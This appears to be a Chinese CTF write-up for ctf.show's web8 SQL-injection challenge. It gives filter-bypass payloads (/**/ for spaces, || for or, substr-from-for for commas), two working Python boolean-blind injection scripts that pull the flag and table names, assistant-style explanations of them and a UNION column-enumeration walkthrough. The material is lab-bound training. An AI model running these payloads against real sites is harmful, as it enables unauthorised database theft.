经测试本题有空格限制、and、','、等限制，需要进行绕过处理

其中空格使用/**/进行绕过成功后

在 `http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=2/**/` 拼接关键词，以此来判断哪些关键词返回sql报错提示，从而有被限制的：` `（空格）、`and`(大小写不能绕过)、`,`（逗号）,`'`(单引号)、union、



web8 ctf.show WEB模块第8关是一个SQL 注入漏洞, 注入点是数值型, 此关卡过滤了空格,逗号,and,union等关键字,

过滤空格, 可以使用括号() 或者注释/**/ 绕过
过滤and, 可以使用or替代
过滤union, 可以用盲注替代联合注入
过滤逗号, 可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用substr(database() from 1 for 1)来代替
判断注入点类型： ?id=-1//or//true（sql语句恒成立全部显示出来了）

id=-1//or//false（恒不成立页面显示空白） 所以为数值型注入。


ctfshow{54dbe8ef-00c0-4fd8-afd4-00c9f66b1137}

----

过滤字符
and
union
or
空格
......
过滤空格可以使用SQL语言的多行注释替代/**/。

不过没有过滤select，所以还是可以正常语句编写。

但是没有了union，所以select查询的结果集无法在页面回显，因此只能另想他法。

如何将查询到的信息传递到自己？
这里要知道三点

or逻辑运算可以替换成||
数据库内置函数ascii()和substr()是可以将我们查询的字符串每个字符提取出来
利用前两点，我们构造一个逻辑运算id=-1||ascii(substr(({{select查询结果字符串}})/**/from/**/{{提取子串位置}}/**/for/**/1))={当前可能的字符ascii值}
这样上述逻辑运算后半段为真，则页面依旧回显，反之页面没有内容。

那么我们遍历子串位置，然后暴力尝试所有可能字符，根据响应长度，就可以判断当前结果集字符串在此位置的具体字符。

假设可能字符有[a-z]|[A-Z]|[0-9]|{_,-,+,\,,\{,\}}，那么每次尝试的可能字符有97种，因为要等服务器响应，所以算上延迟假设0.5s。

通常一个flag的长度在9到60，最坏时间要0.5*60*97=2910s，所以还是要等很久，那么如何优化呢？

如果优化等待时间？
我们可以将逻辑运算改为这样

id=-1||ascii(substr(({select查询结果字符串})/**/from/**/{提取子串位置}/**/for/**/1))<={当前可能的字符ascii值}
运用二分查找可以，将查找97种的字符的平均次数降低为6次。因此再次计算最坏时间为0.5*60*6=180s，当然实际情况会根据服务器响应速度降低很多。

代码使用python编写
```python

import requests

url = "http://390226a3-4612-416d-b31b-5f06c69cc09a.challenge.ctf.show/index.php?id=-1"
flag = ""


def check(mid, num):
    sql = "/**/||/**/ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/{:d}/**/for/**/1))<={:d}".format(num,mid)
    payload = url + sql
    res = requests.get(payload)
    return 'If' in res.text

def bsearch(l, r, num):
    while l < r:
        mid = (l + r) >> 1
        if check(mid, num): r = mid    # check()判断mid是否满足性质
        else: l = mid + 1
    return l

for num in range(1, 60):
    l = 33
    r = 130
    res = bsearch(l, r, num)
    if chr(res) == "!":
        break
    flag += chr(res)
    print(f'第{num}次遍历结果:{flag}')
```

----

爆破脚本，给的示列是爆flag的，爆表名其他的可以改其中的url，i 是数据长度，j是ascii码，按照脚本上的url替换上去即可

```python

-- coding: utf-8 --
import requests

data = []

data_len = 0

for i in range(1, 150):

	data_len_check = data_len

	for j in range(32, 127):
	
	    url = f'http://xxxxx.ctf.show/index.php?id=-1||ascii(substr((select/**/group_concat(flag)/**/from/**/flag)from/**/{i}/**/for/**/1))={j}'   # 爆flag
	
	    # 下面这条是爆表名的
	    #url = f'http://xxxxx.ctf.show/index.phpid=-1||ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/{i}/**/for/**/1))={j}'
	
	    res = requests.get(url)
	
	    if 'By Rudyard Kipling' in res.text:
	
	        data.append(chr(j))
	
	        print("".join(data))
	
	        data_len += 1
	
	        break

if data_len_check == data_len:

    break
```





          
好的，这段Python代码是一个典型的**布尔盲注（Boolean-based Blind SQL Injection）**脚本，用于在SQL注入漏洞中，当数据库不直接返回错误信息或查询结果时，通过判断页面内容变化来逐字符猜测数据库中的数据。

下面我将详细解释这段代码的工作原理、它绕过了哪些限制、适用场景以及其优劣。

### 代码解释

```python
import requests # 导入requests库，用于发送HTTP请求

data = [] # 用于存储猜测到的字符
data_len = 0 # 用于记录已猜测到的字符数量

# 外层循环：逐个猜测目标字符串的字符位置
# range(1, 150) 意味着它会尝试猜测目标字符串的前149个字符
for i in range(1, 150): 
    data_len_check = data_len # 在内层循环开始前，记录当前已猜测到的字符数量

    # 内层循环：逐个猜测当前字符位置（i）的ASCII值
    # range(32, 127) 覆盖了常见的可打印ASCII字符（从空格到~）
    for j in range(32, 127): 
        # 构造SQL注入的URL
        # 爆flag的URL示例：
        url = f'http://ffe49362-5a3b-4778-93d1-04c4d7a8e1f0.challenge.ctf.show/index.php?id=-1||ascii(substr((select/**/group_concat(flag)/**/from/**/flag)from/**/{i}/**/for/**/1))={j}'   # 爆flag 
        
        # 爆表名的URL示例（被注释掉）：
        #url = f'http://xxxxx.ctf.show/index.php？id=-1||ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/{i}/**/for/**/1))={j}' 
        
        res = requests.get(url) # 发送HTTP GET请求

        # 判断页面内容是否包含特定字符串
        # 如果包含，说明SQL条件为真，即当前字符的ASCII值就是j
        if 'By Rudyard Kipling' in res.text: 
            data.append(chr(j)) # 将ASCII值j转换为字符并添加到data列表中
            print("".join(data)) # 打印当前已猜测到的字符串
            data_len += 1 # 已猜测到的字符数量加1
            break # 找到当前字符后，跳出内层循环，开始猜测下一个字符位置

    # 如果内层循环结束后，data_len_check == data_len，
    # 说明当前字符位置没有找到匹配的ASCII值，通常意味着目标字符串已经结束
    if data_len_check == data_len: 
        break # 跳出外层循环，结束猜测
```

### 绕过限制和原理

这段代码主要针对以下几种常见的SQL注入过滤进行绕过：

1.  **绕过空格过滤：**
    *   **原理：** 使用 `/**/` 多行注释来代替空格。在SQL中，`/**/` 被数据库解析器识别为空格，但很多WAF（Web Application Firewall）或过滤规则可能不会将其识别为空格而直接放行。
    *   **示例：** `select/**/group_concat(flag)/**/from/**/flag` 中的 `/**/`。

2.  **绕过逗号过滤：**
    *   **原理：** 利用MySQL中 `SUBSTR()` 函数的另一种语法 `SUBSTR(string FROM start FOR length)` 来代替 `SUBSTR(string, start, length)`。这种语法不需要逗号。
    *   **示例：** `substr( ... from/**/{i}/**/for/**/1)`。

3.  **绕过引号过滤：**
    *   **原理：** 不直接使用字符串字面量（如 `'a'`），而是将字符转换为其ASCII值进行比较。这样就避免了在SQL语句中使用单引号或双引号。
    *   **示例：** `... = {j}`，其中 `{j}` 是一个整数，代表字符的ASCII值。

4.  **绕过 `AND` / `OR` 关键字过滤：**
    *   **原理：** 使用 `||` 逻辑运算符来代替 `OR` 关键字。在某些SQL方言（如MySQL）中，`||` 可以作为逻辑或运算符使用。
    *   **示例：** `id=-1||ascii(...)`。

5.  **绕过 `UNION` 关键字过滤：**
    *   **原理：** 这段代码使用的是**布尔盲注**，而不是**联合查询注入（UNION SELECT Injection）**。因此，即使 `UNION` 关键字被过滤，这种方法依然有效，因为它根本不使用 `UNION`。

**核心原理：布尔盲注**

*   **逐字符猜测：** 攻击者无法直接看到数据库的返回结果，但可以通过构造SQL语句，让数据库执行一个布尔（真/假）判断，然后根据Web页面返回的不同（例如，页面是否包含某个特定字符串，或者页面大小、响应时间等）来推断SQL条件是真还是假。
*   **二分法或逐位猜测：** 这段代码采用的是逐位猜测法。它从ASCII码32（空格）到126（波浪号）遍历所有可能的字符，直到找到一个使页面返回“真”状态的ASCII值，从而确定当前位置的字符。
*   **`id=-1` 的作用：** 通常，`id=-1` 会使原始查询条件为假，从而让 `||` 后面的注入语句成为主导条件。如果原始查询是 `SELECT * FROM products WHERE id = [用户输入]`，那么 `id=-1` 会导致没有产品被选中，此时 `||` 后面的条件就决定了页面的显示。

### 适用场景

*   **Web应用存在SQL注入漏洞，但没有错误回显：** 当数据库错误信息被屏蔽，无法通过错误信息获取数据时，盲注是常用的方法。
*   **Web页面根据SQL查询结果有明显差异：** 页面内容、HTTP状态码、响应时间等会根据SQL条件真假而变化。这段代码就是通过判断页面是否包含 `'By Rudyard Kipling'` 来区分真假。
*   **过滤严格，常规注入方法受阻：** 当引号、逗号、空格、`AND`、`UNION` 等关键字被过滤时，这种利用特殊语法和ASCII值比较的盲注方法能有效绕过。
*   **目标数据库为MySQL：** 代码中使用了 `/**/`、`substr(... from ... for ...)` 和 `group_concat()` 等MySQL特有的语法或函数。

### 优劣分析

**优点：**

1.  **隐蔽性强：** 不直接在页面上显示数据，而是通过页面状态变化来判断，相对不容易被WAF或日志系统发现。
2.  **绕过能力强：** 能够有效绕过对空格、逗号、引号、`AND`/`OR`、`UNION` 等常见关键字的过滤。
3.  **适用范围广：** 只要页面存在布尔逻辑差异，就可以进行盲注，不受限于错误回显。
4.  **可获取任意数据：** 理论上可以获取数据库中的任何数据，只要能构造出相应的SQL查询。

**缺点：**

1.  **效率低下：** 逐字符、逐位猜测的方式非常耗时。要获取一个长字符串，需要发送大量的HTTP请求。例如，一个100个字符的flag，每个字符需要猜测约95次（127-32），总共需要9500次请求。
2.  **依赖页面差异：** 必须找到一个可靠的页面差异（如特定字符串、页面长度、响应时间）来判断SQL条件的真假。如果页面差异不明显或不稳定，盲注将难以进行。
3.  **对网络环境要求高：** 大量的HTTP请求对网络带宽和稳定性有一定要求。
4.  **容易被检测：** 虽然隐蔽，但大量的请求模式（特别是时间盲注）容易触发WAF的异常流量检测。
5.  **数据库依赖性：** 代码中使用了MySQL特有的语法，如果目标数据库不是MySQL，则需要修改注入语句。

### 总结

这段Python代码提供了一个在严格过滤环境下进行布尔盲注的有效示例。它通过巧妙地利用SQL语法特性和ASCII值比较，成功绕过了多种常见的SQL注入限制。然而，其效率较低，通常需要结合自动化工具和对目标系统深入的了解才能高效利用。在实际渗透测试中，理解并掌握这种盲注技术是非常重要的。
        

逻辑真的返回页面
![[0008web8-逻辑真.png]]
逻辑假的返回页面
![[0008web8-逻辑假.png]]

----




          
好的，我们来详细分析一下这段URL中构造的SQL语句：

`id=-1||ascii(substr((select/**/group_concat(flag)/**/from/**/flag)from/**/{i}/**/for/**/1))={j}`

假设原始的Web应用程序后端SQL查询大致是这样的（以PHP为例）：

```php
$id = $_GET['id'];
$sql = "SELECT * FROM products WHERE id = " . $id;
// ... 执行SQL查询 ...
```

当我们将注入语句 `id=-1||ascii(substr((select/**/group_concat(flag)/**/from/**/flag)from/**/{i}/**/for/**/1))={j}` 拼接到 `id` 参数后，最终在数据库中执行的SQL语句会变成（假设 `id` 是一个数字类型）：

```sql
SELECT * FROM products WHERE id = -1 || ascii(substr((select/**/group_concat(flag)/**/from/**/flag)from/**/{i}/**/for/**/1))={j}
```

现在我们逐一拆解这句SQL的各个部分，解释其作用和为什么这样写：

### 1. `id = -1`

*   **作用：** 这部分是为了让原始的 `WHERE` 条件 `id = [用户输入]` 变为假。
*   **为什么这样写：** 通常，`id` 是一个正整数，`id = -1` 几乎不可能在数据库中找到匹配的记录。这样做的目的是为了确保 `||` 逻辑或运算符左侧的条件为假，从而让整个 `WHERE` 子句的真假完全取决于 `||` 右侧我们注入的条件。如果 `id` 是一个字符串类型，可能会写成 `id='-1'`，但这里没有引号，说明它被当作数字处理。

### 2. `||` (逻辑或运算符)

*   **作用：** 在SQL中，`||` 是一个逻辑或运算符（在某些数据库中，如MySQL，它也可以是字符串连接符，但在这里作为逻辑运算符使用）。它连接 `id = -1` 和我们注入的条件。
*   **为什么这样写：** 当 `AND` 关键字被过滤时，`||` 是一个常见的替代方案。由于 `id = -1` 几乎总是假，所以整个 `WHERE` 子句的真假就取决于 `||` 右侧的表达式。如果右侧表达式为真，则整个 `WHERE` 子句为真，页面会显示正常；如果右侧表达式为假，则整个 `WHERE` 子句为假，页面会显示异常。这是布尔盲注的核心。

### 3. `ascii(substr((select/**/group_concat(flag)/**/from/**/flag)from/**/{i}/**/for/**/1))={j}`

这是注入的核心部分，我们再细分：

#### a. `select/**/group_concat(flag)/**/from/**/flag`

*   **作用：** 这是一个子查询，用于从名为 `flag` 的表中获取 `flag` 列的所有值，并将它们连接成一个字符串。
*   **`flag` 表和 `flag` 列：** 在CTF（Capture The Flag）比赛中，通常会有一个名为 `flag` 的表，其中包含一个名为 `flag` 的列，存储着需要获取的“旗帜”字符串。
*   **`group_concat()` 函数：**
    *   **作用：** 这是一个MySQL特有的聚合函数，可以将多行数据中的某个列值连接成一个字符串，并用逗号分隔（默认）。这在盲注中非常有用，因为它能将整个 `flag` 列的内容一次性提取出来，方便后续处理。
    *   **为什么这样写：** 如果 `flag` 表中有多行数据，`group_concat()` 可以将它们合并成一个字符串，避免了逐行查询的麻烦。
*   **`/**/`：**
    *   **作用：** 替代了SQL语句中的空格。
    *   **为什么这样写：** 因为空格被过滤了，`/**/` 是一个常见的绕过方式，数据库会将其解析为空格，但WAF可能不会识别。

#### b. `substr((...),from/**/{i}/**/for/**/1)`

*   **作用：** 从上一步 `group_concat(flag)` 得到的字符串中，截取第 `{i}` 个字符。
*   **`substr()` 函数：**
    *   **作用：** 字符串截取函数。
    *   **`from/**/{i}/**/for/**/1`：** 这是MySQL中 `SUBSTR()` 函数的一种特殊语法，用于替代 `SUBSTR(string, start, length)`。
        *   `from/**/{i}`：表示从字符串的第 `{i}` 个位置开始截取。这里的 `{i}` 是Python脚本中的循环变量，代表当前正在猜测的字符位置。
        *   `for/**/1`：表示截取长度为1的字符。
    *   **为什么这样写：** 因为逗号 `,` 被过滤了，所以不能使用 `SUBSTR(string, i, 1)` 这种常见语法。`from ... for ...` 语法巧妙地绕过了逗号的限制。
    *   **`/**/`：** 再次用于替代空格，绕过过滤。

#### c. `ascii(...)`

*   **作用：** 将上一步截取到的单个字符转换为其对应的ASCII整数值。
*   **为什么这样写：** 因为引号 `'` 被过滤了，我们无法直接比较 `substr(...) = 'a'` 这样的字符串。通过将字符转换为ASCII值，我们就可以用整数进行比较，从而绕过引号的限制。

#### d. `={j}`

*   **作用：** 将上一步得到的ASCII值与我们猜测的ASCII值 `{j}` 进行比较。
*   **为什么这样写：** 这里的 `{j}` 是Python脚本中的循环变量，代表当前正在尝试的ASCII值（从32到126）。如果 `substr(...)` 得到的字符的ASCII值恰好等于 `{j}`，那么这个条件就为真。

### 整体SQL语句的作用和原理

综合起来，这条SQL注入语句的目的是：

1.  **让原始查询条件失效：** `id = -1` 确保了原始 `WHERE` 条件为假。
2.  **利用逻辑或：** `||` 使得整个 `WHERE` 子句的真假完全取决于我们注入的条件。
3.  **获取目标数据：** `(select/**/group_concat(flag)/**/from/**/flag)` 获取到完整的 `flag` 字符串。
4.  **逐字符提取：** `substr(...,from/**/{i}/**/for/**/1)` 逐个提取 `flag` 字符串中的字符。
5.  **转换为ASCII值：** `ascii(...)` 将提取的字符转换为整数。
6.  **进行布尔判断：** `={j}` 将提取字符的ASCII值与我们猜测的ASCII值 `{j}` 进行比较。

**最终效果：**

*   当 `flag` 字符串中第 `{i}` 个字符的ASCII值**等于** `{j}` 时，整个注入条件为真，`WHERE` 子句为真，页面会显示正常（例如，包含 "By Rudyard Kipling"）。
*   当 `flag` 字符串中第 `{i}` 个字符的ASCII值**不等于** `{j}` 时，整个注入条件为假，`WHERE` 子句为假，页面会显示异常。

Python脚本就是利用这种页面响应的差异，通过不断尝试 `{i}` 和 `{j}` 的值，最终拼凑出完整的 `flag` 字符串。

### 总结

这种构造方式是布尔盲注的典型应用，它通过巧妙地利用SQL语法特性（如 `/**/` 替代空格，`from ... for ...` 替代逗号，`ascii()` 替代引号）和逻辑运算符 `||`，在没有错误回显和严格过滤的情况下，逐字符地从数据库中提取敏感信息。这种方法虽然效率较低，但却是面对严格过滤时非常有效的手段。


---




          
好的，ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）是一个字符编码标准，它将数字、字母、符号等字符映射到7位二进制数（0-127）上。在SQL注入中，由于引号被过滤，我们经常需要将字符转换为其ASCII值进行比较，或者将ASCII值转换为字符来构造字符串。

下面是ASCII码表，包含了从0到127的常用字符及其十进制、十六进制和二进制表示。

### ASCII 码表

| 十进制 (Dec) | 十六进制 (Hex) | 字符 (Char) | 描述 (Description) |
| :----------: | :------------: | :---------: | :-----------------: |
|      0       |       00       |     NUL     |     空字符 (Null)     |
|      1       |       01       |     SOH     |   标题开始 (Start of Header)   |
|      2       |       02       |     STX     |   正文开始 (Start of Text)   |
|      3       |       03       |     ETX     |   正文结束 (End of Text)   |
|      4       |       04       |     EOT     |   传输结束 (End of Transmission)   |
|      5       |       05       |     ENQ     |     询问 (Enquiry)     |
|      6       |       06       |     ACK     |     肯定应答 (Acknowledge)     |
|      7       |       07       |     BEL     |       响铃 (Bell)       |
|      8       |       08       |     BS      |     退格 (Backspace)     |
|      9       |       09       |     HT      |   水平制表符 (Horizontal Tab)   |
|      10      |       0A       |     LF      |     换行 (Line Feed)     |
|      11      |       0B       |     VT      |   垂直制表符 (Vertical Tab)   |
|      12      |       0C       |     FF      |     换页 (Form Feed)     |
|      13      |       0D       |     CR      |     回车 (Carriage Return)     |
|      14      |       0E       |     SO      |   不显示 (Shift Out)   |
|      15      |       0F       |     SI      |   启用显示 (Shift In)   |
|      16      |       10       |     DLE     |   数据链路转义 (Data Link Escape)   |
|      17      |       11       |     DC1     |   设备控制 1 (Device Control 1)   |
|      18      |       12       |     DC2     |   设备控制 2 (Device Control 2)   |
|      19      |       13       |     DC3     |   设备控制 3 (Device Control 3)   |
|      20      |       14       |     DC4     |   设备控制 4 (Device Control 4)   |
|      21      |       15       |     NAK     |     否定应答 (Negative Acknowledge)     |
|      22      |       16       |     SYN     |     同步空闲 (Synchronous Idle)     |
|      23      |       17       |     ETB     |   传输块结束 (End of Transmission Block)   |
|      24      |       18       |     CAN     |     取消 (Cancel)     |
|      25      |       19       |     EM      |     介质结束 (End of Medium)     |
|      26      |       1A       |     SUB     |     替换 (Substitute)     |
|      27      |       1B       |     ESC     |     转义 (Escape)     |
|      28      |       1C       |     FS      |   文件分隔符 (File Separator)   |
|      29      |       1D       |     GS      |   组分隔符 (Group Separator)   |
|      30      |       1E       |     RS      |   记录分隔符 (Record Separator)   |
|      31      |       1F       |     US      |   单元分隔符 (Unit Separator)   |
|      32      |       20       |     Space   |       空格 (Space)       |
|      33      |       21       |      !      |     感叹号 (Exclamation Mark)     |
|      34      |       22       |      "      |     双引号 (Double Quote)     |
|      35      |       23       |      #      |     井号 (Number Sign)     |
|      36      |       24       |      $      |     美元符 (Dollar Sign)     |
|      37      |       25       |      %      |     百分号 (Percent Sign)     |
|      38      |       26       |      &      |     和号 (Ampersand)     |
|      39      |       27       |      '      |     单引号 (Apostrophe)     |
|      40      |       28       |      (      |     左括号 (Left Parenthesis)     |
|      41      |       29       |      )      |     右括号 (Right Parenthesis)     |
|      42      |       2A       |      *      |     星号 (Asterisk)     |
|      43      |       2B       |      +      |     加号 (Plus Sign)     |
|      44      |       2C       |      ,      |     逗号 (Comma)     |
|      45      |       2D       |      -      |     连字符 (Hyphen-Minus)     |
|      46      |       2E       |      .      |     句号 (Period)     |
|      47      |       2F       |      /      |     斜杠 (Slash)     |
|      48      |       30       |      0      |       数字 0 (Digit 0)       |
|      49      |       31       |      1      |       数字 1 (Digit 1)       |
|      50      |       32       |      2      |       数字 2 (Digit 2)       |
|      51      |       33       |      3      |       数字 3 (Digit 3)       |
|      52      |       34       |      4      |       数字 4 (Digit 4)       |
|      53      |       35       |      5      |       数字 5 (Digit 5)       |
|      54      |       36       |      6      |       数字 6 (Digit 6)       |
|      55      |       37       |      7      |       数字 7 (Digit 7)       |
|      56      |       38       |      8      |       数字 8 (Digit 8)       |
|      57      |       39       |      9      |       数字 9 (Digit 9)       |
|      58      |       3A       |      :      |     冒号 (Colon)     |
|      59      |       3B       |      ;      |     分号 (Semicolon)     |
|      60      |       3C       |      <      |     小于号 (Less-than Sign)     |
|      61      |       3D       |      =      |     等号 (Equals Sign)     |
|      62      |       3E       |      >      |     大于号 (Greater-than Sign)     |
|      63      |       3F       |      ?      |     问号 (Question Mark)     |
|      64      |       40       |      @      |     艾特符 (At Sign)     |
|      65      |       41       |      A      |     大写字母 A (Uppercase A)     |
|      66      |       42       |      B      |     大写字母 B (Uppercase B)     |
|      67      |       43       |      C      |     大写字母 C (Uppercase C)     |
|      68      |       44       |      D      |     大写字母 D (Uppercase D)     |
|      69      |       45       |      E      |     大写字母 E (Uppercase E)     |
|      70      |       46       |      F      |     大写字母 F (Uppercase F)     |
|      71      |       47       |      G      |     大写字母 G (Uppercase G)     |
|      72      |       48       |      H      |     大写字母 H (Uppercase H)     |
|      73      |       49       |      I      |     大写字母 I (Uppercase I)     |
|      74      |       4A       |      J      |     大写字母 J (Uppercase J)     |
|      75      |       4B       |      K      |     大写字母 K (Uppercase K)     |
|      76      |       4C       |      L      |     大写字母 L (Uppercase L)     |
|      77      |       4D       |      M      |     大写字母 M (Uppercase M)     |
|      78      |       4E       |      N      |     大写字母 N (Uppercase N)     |
|      79      |       4F       |      O      |     大写字母 O (Uppercase O)     |
|      80      |       50       |      P      |     大写字母 P (Uppercase P)     |
|      81      |       51       |      Q      |     大写字母 Q (Uppercase Q)     |
|      82      |       52       |      R      |     大写字母 R (Uppercase R)     |
|      83      |       53       |      S      |     大写字母 S (Uppercase S)     |
|      84      |       54       |      T      |     大写字母 T (Uppercase T)     |
|      85      |       55       |      U      |     大写字母 U (Uppercase U)     |
|      86      |       56       |      V      |     大写字母 V (Uppercase V)     |
|      87      |       57       |      W      |     大写字母 W (Uppercase W)     |
|      88      |       58       |      X      |     大写字母 X (Uppercase X)     |
|      89      |       59       |      Y      |     大写字母 Y (Uppercase Y)     |
|      90      |       5A       |      Z      |     大写字母 Z (Uppercase Z)     |
|      91      |       5B       |      [      |     左方括号 (Left Square Bracket)     |
|      92      |       5C       |      \      |     反斜杠 (Backslash)     |
|      93      |       5D       |      ]      |     右方括号 (Right Square Bracket)     |
|      94      |       5E       |      ^      |     脱字号 (Caret)     |
|      95      |       5F       |      _      |     下划线 (Underscore)     |
|      96      |       60       |      `      |     反引号 (Grave Accent)     |
|      97      |       61       |      a      |     小写字母 a (Lowercase a)     |
|      98      |       62       |      b      |     小写字母 b (Lowercase b)     |
|      99      |       63       |      c      |     小写字母 c (Lowercase c)     |
|     100      |       64       |      d      |     小写字母 d (Lowercase d)     |
|     101      |       65       |      e      |     小写字母 e (Lowercase e)     |
|     102      |       66       |      f      |     小写字母 f (Lowercase f)     |
|     103      |       67       |      g      |     小写字母 g (Lowercase g)     |
|     104      |       68       |      h      |     小写字母 h (Lowercase h)     |
|     105      |       69       |      i      |     小写字母 i (Lowercase i)     |
|     106      |       6A       |      j      |     小写字母 j (Lowercase j)     |
|     107      |       6B       |      k      |     小写字母 k (Lowercase k)     |
|     108      |       6C       |      l      |     小写字母 l (Lowercase l)     |
|     109      |       6D       |      m      |     小写字母 m (Lowercase m)     |
|     110      |       6E       |      n      |     小写字母 n (Lowercase n)     |
|     111      |       6F       |      o      |     小写字母 o (Lowercase o)     |
|     112      |       70       |      p      |     小写字母 p (Lowercase p)     |
|     113      |       71       |      q      |     小写字母 q (Lowercase q)     |
|     114      |       72       |      r      |     小写字母 r (Lowercase r)     |
|     115      |       73       |      s      |     小写字母 s (Lowercase s)     |
|     116      |       74       |      t      |     小写字母 t (Lowercase t)     |
|     117      |       75       |      u      |     小写字母 u (Lowercase u)     |
|     118      |       76       |      v      |     小写字母 v (Lowercase v)     |
|     119      |       77       |      w      |     小写字母 w (Lowercase w)     |
|     120      |       78       |      x      |     小写字母 x (Lowercase x)     |
|     121      |       79       |      y      |     小写字母 y (Lowercase y)     |
|     122      |       7A       |      z      |     小写字母 z (Lowercase z)     |
|     123      |       7B       |      {      |     左花括号 (Left Curly Bracket)     |
|     124      |       7C       |      \|     |     竖线 (Vertical Bar)     |
|     125      |       7D       |      }      |     右花括号 (Right Curly Bracket)     |
|     126      |       7E       |      ~      |     波浪号 (Tilde)     |
|     127      |       7F       |     DEL     |     删除 (Delete)     |

### 如何使用 ASCII 码表进行 SQL 注入

在SQL注入中，当引号被过滤时，我们无法直接使用 `'a'` 这样的字符串。这时，就可以利用 `ASCII()` 函数将字符转换为其十进制值，然后进行数字比较。

**例如：**

*   如果你想判断某个字符是否为 `'a'`，你可以写成 `ASCII(your_char) = 97`。
*   如果你想构造一个字符串 `'admin'`，但引号被过滤，你可以尝试使用 `CHAR()` 函数和ASCII值：`CHAR(97,100,109,105,110)`。

在您提供的Python脚本中，`for j in range(32, 127):` 就是遍历了所有可打印的ASCII字符（从空格32到波浪号126），通过 `ascii(...) = {j}` 来逐一猜测目标字符的ASCII值。

理解ASCII码表对于进行字符编码、绕过过滤和构造注入payload都非常重要。
        

------



          
您好！根据您提供的信息和测试结果，我们可以一步步来排查和解决这个 SQL 注入问题。

### 问题分析

1.  **`http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=2/**/or/**/1=1/**/unio/**/n/**/select/**/1,2,3/#` 提示 `sql inject error`**
    *   **最直接的原因：** `UNION SELECT` 语句要求前后两个 `SELECT` 查询的列数必须一致。当您使用 `SELECT 1,2,3` 时，很可能原始查询（即 `id=2` 对应的查询）返回的列数不是 3 列。列数不匹配是 `UNION` 查询最常见的错误之一。
    *   **验证：** 您已经发现 `SELECT 1` 没有报错，而 `SELECT 1,2,3` 报错，这进一步证实了列数不匹配的可能性。

2.  **`http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=2/**/or/**/1=1/**/unio/**/n/**/select/**/1#` 没有提示错误，显示 `文章列表`**
    *   这表明 `id=2/**/or/**/1=1` 成功使条件为真，并且 `unio/**/n/**/select/**/1` 这部分语法是正确的，且列数匹配。这非常关键，说明 `UNION` 注入是可行的。

3.  **`AND` 不能使用**
    *   这是一个常见的关键字过滤。

4.  **有空格限制**
    *   您已经成功使用了 `/**/` 来绕过空格限制，这是一个很好的发现。

### 排查步骤与绕过方法

现在，我们来一步步排查并尝试注入。

#### 步骤一：确定原始查询的列数

这是当前最关键的一步。有两种主要方法：

**方法一：使用 `ORDER BY` 子句 (推荐)**

`ORDER BY` 子句用于对查询结果进行排序。当 `ORDER BY` 的列数超过实际查询的列数时，数据库会报错。通过这个特性，我们可以逐一尝试，直到报错，从而确定列数。

1.  **尝试 `ORDER BY 1`：**
    ```
    http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=2/**/or/**/1=1/**/order/**/by/**/1#
    ```
    *   如果页面正常，说明至少有 1 列。

2.  **尝试 `ORDER BY 2`：**
    ```
    http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=2/**/or/**/1=1/**/order/**/by/**/2#
    ```
    *   如果页面正常，说明至少有 2 列。

3.  **继续增加数字，直到页面报错。**
    *   例如，如果 `ORDER BY 3` 正常，`ORDER BY 4` 报错，那么原始查询的列数就是 3。

**方法二：使用 `UNION SELECT` 逐一增加列数**

您已经部分使用了这种方法。

1.  **尝试 `UNION SELECT 1`：** (您已测试，正常)
    ```
    http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=2/**/or/**/1=1/**/unio/**/n/**/select/**/1#
    ```

2.  **尝试 `UNION SELECT 1,2`：**
    ```
    http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=2/**/or/**/1=1/**/unio/**/n/**/select/**/1,2#
    ```

3.  **继续增加列，直到页面报错。**
    *   例如，如果 `SELECT 1,2` 正常，`SELECT 1,2,3` 报错，那么列数就是 2。

**假设我们通过上述方法确定列数为 N。**

#### 步骤二：绕过 `AND` 限制

由于 `AND` 被过滤，我们可以尝试以下替代方案：

1.  **使用 `OR`：**
    *   您已经在 `id=2/**/or/**/1=1` 中成功使用了 `OR`，这表明 `OR` 是可用的。在后续的注入中，如果需要连接条件，可以使用 `OR`。

2.  **使用 `&&` (逻辑与)：**
    *   在 MySQL 中，`&&` 可以作为 `AND` 的替代。
    *   **尝试：** `id=2/**/or/**/1=1/**/&&/**/1=1` (如果需要 `AND` 逻辑)

3.  **使用 `||` (逻辑或)：**
    *   在 MySQL 中，`||` 可以作为 `OR` 的替代。

4.  **使用 `XOR` (异或)：**
    *   在某些情况下，`XOR` 也可以用于构造逻辑。

5.  **内联注释绕过 `AND`：**
    *   如果 `AND` 只是被简单过滤，可以尝试 `A/**/ND`。但您已经发现 `AND` 不能使用，所以这可能不是一个简单的过滤。

#### 步骤三：识别可回显的列 (Displayable Columns)

一旦确定了列数 N，下一步是找出哪些列的内容会显示在页面上。

1.  **构造 `UNION SELECT` 语句，将列替换为数字或特殊字符：**
    *   例如，如果列数为 3，尝试：
        ```
        http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,2,3#
        ```
        **注意：** 将 `id` 的值改为 `-1` 或一个不存在的值，这样原始查询就不会返回结果，页面只会显示 `UNION SELECT` 的结果。

2.  **观察页面：**
    *   页面上会显示 `1`、`2`、`3` 中的一个或多个数字。这些数字出现的位置就是可回显的列。
    *   例如，如果页面显示 `文章列表 2`，说明第 2 列是可回显的。

#### 步骤四：信息收集 (利用可回显列)

找到可回显的列后，就可以开始收集数据库信息了。

1.  **获取数据库版本：**
    *   假设第 2 列可回显，替换 `2` 为 `version()`：
        ```
        http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,version(),3#
        ```

2.  **获取当前数据库名：**
    *   替换为 `database()`：
        ```
        http://3fa9083d-7a8c-4561-8622-360c9c046767.challenge.ctf.show/index.php?id=-1/**/unio/**/n/**/select/**/1,database(),3#
        ```

3.  **获取当前用户：**
